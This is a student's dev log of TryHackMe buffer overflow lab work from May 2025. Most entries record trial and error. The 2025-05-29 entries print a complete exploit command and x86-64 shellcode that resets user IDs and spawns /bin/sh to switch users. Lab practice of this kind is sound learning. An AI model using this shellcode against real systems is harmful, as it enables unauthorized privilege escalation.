# Dev Log:

This document must be updated daily every time you finish a work session.

## Jakob Weir

### 2025-05-16 - TryHackMe
Spent class time doing TryHackMe on buffer overflow.

### 2025-05-19 - THM Continued
Tried to continue TryHackMe, but had trouble figuring out how to run the C code properly.

### 2025-05-20 - Further look into THM
Caught up absent group member, successfully ran C code, looked at ways to complete next part, including seeing memory addresses.

### 2025-05-21 - AP macroeconomics exam

### 2025-05-22 - Further THM research
Got an understanding of how to find and manipulate stacks. Learned some from https://medium.com/@cyberlarry/walkthrough-tryhackme-buffer-overflows-task-7-overwriting-function-pointers-ac1336979261.

### 2025-05-23 - Running on lab computers
Ran some of the TryHackMe code on lab computers to test buffer overflow there after much trial and error.

### 2025-05-27 - Strange character
Tried to figure out why there was 8c instead of cc. Eventually fixed by using a payload instead of Python output.
From the walkthrough:
Because of the order in which Unix-based systems allocate memory, we need to unset some environment variables in order to use the same memory addresses inside and outside gdb. We need to unset env LINES and unset env COLUMNS within gdb with this command:

`set exec-wrapper env -u LINES -u COLUMNS`

### 2025-05-28 - Using buffer overflow for root access
Continued to next THM section. [THM](https://tryhackme.com/room/bof1). [Walkthrough](https://l1ge.github.io/tryhackme_bof1/).

### 2025-05-29 - Continuing trying to access a different user
More THM. Found `./buffer-overflow $(python -c "print('\x90'*86+'\x48\x31\xFF\x48\x31\xC0\x48\x31\xF6\x66\xBE\xEA\x03\x66\xBF\xEA\x03\xB0\x71\x0F\x05\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05\x6A\x01\x5F\x6A\x3C\x58\x0F\x05' + 'A'*12 + '\x98\xe2\xff\xff\xff\x7f')")` but didn't work. Will retry later.

Later that day: Copy pasting from the walkthrough gave me user2 access. Tried task 9. Generated assembly code "\x48\x31\xFF\x48\x31\xC0\x48\x31\xF6\x66\xBE\xEB\x03\x66\xBF\xEB\x03\xB0\x71\x0F\x05\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05\x6A\x01\x5F\x6A\x3C\x58\x0F\x05" for switching to user3 but did not work. Will figure out more.

### 2025-05-30 - Moving to task 9
Found a walkthrough for task 9, somewhat helpful for my understanding. Pwntools is a help and can probably be used a lot in this project.
